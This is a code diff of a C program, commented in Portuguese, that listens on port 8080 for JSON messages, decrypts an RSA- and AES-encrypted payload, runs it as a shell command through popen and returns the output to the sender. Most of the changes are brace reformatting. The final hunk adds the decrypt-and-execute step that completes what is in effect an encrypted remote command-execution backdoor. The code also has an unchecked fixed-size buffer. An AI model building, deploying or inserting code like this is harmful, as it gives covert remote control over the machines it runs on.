@@ -12,12 +12,13 @@
 #include <openssl/bio.h>
 #include <openssl/buffer.h>
 
-#include <cjson/cJSON.h>  // lib cJSON
+#include <cjson/cJSON.h> // lib cJSON
 
 #define PORT 8080
 
 // Função para decodificar base64
-unsigned char *base64_decode(const char *input, int *len) {
+unsigned char *base64_decode(const char *input, int *len)
+{
     BIO *b64, *bmem;
     int input_len = strlen(input);
     unsigned char *buffer = malloc(input_len);
@@ -34,23 +35,27 @@ unsigned char *base64_decode(const char *input, int *len) {
 }
 
 // Executa o comando recebido e envia de volta a saída
-void execute_command(const char *cmd, int client_sock) {
+void execute_command(const char *cmd, int client_sock)
+{
     FILE *fp = popen(cmd, "r");
-    if (!fp) {
+    if (!fp)
+    {
         char *err = "Erro ao executar comando\n";
         send(client_sock, err, strlen(err), 0);
         return;
     }
 
     char output[1024];
-    while (fgets(output, sizeof(output), fp) != NULL) {
+    while (fgets(output, sizeof(output), fp) != NULL)
+    {
         send(client_sock, output, strlen(output), 0);
     }
 
     pclose(fp);
 }
 
-int main() {
+int main()
+{
     int sockfd, client_sock;
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_len = sizeof(client_addr);
@@ -75,7 +80,8 @@ int main() {
 
     // Parse do JSON recebido
     cJSON *json = cJSON_Parse(buffer);
-    if (!json) {
+    if (!json)
+    {
         fprintf(stderr, "Erro ao parsear JSON\n");
         close(client_sock);
         return 1;
@@ -83,14 +89,15 @@ int main() {
 
     const char *keyblob_b64 = cJSON_GetObjectItem(json, "keyblob")->valuestring;
     const char *payload_b64 = cJSON_GetObjectItem(json, "payload")->valuestring;
-    
+
     // Decodifica keyblob (RSA-encrypted AES+IV)
     int key_iv_len;
     unsigned char *key_iv_enc = base64_decode(keyblob_b64, &key_iv_len);
 
     // Carrega chave privada RSA
     FILE *priv_file = fopen("private.pem", "r");
-    if (!priv_file) {
+    if (!priv_file)
+    {
         fprintf(stderr, "Erro ao abrir private.pem\n");
         return 1;
     }
@@ -116,7 +123,23 @@ int main() {
     unsigned char plaintext[1024];
     int len, plaintext_len;
 
+    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);
+    EVP_DecryptUpdate(ctx, plaintext, &len, payload_enc, payload_len);
+    plaintext_len = len;
+    EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
+    plaintext_len += len;
+    EVP_CIPHER_CTX_free(ctx);
+    free(payload_enc);
 
+    plaintext[plaintext_len] = '\0'; // Garante string finalizada
+
+    // Executa comando e envia resultado de volta
+    execute_command((char *)plaintext, client_sock);
+
+    // Finaliza
+    close(client_sock);
+    close(sockfd);
+    cJSON_Delete(json);
 
     return 0;
 }
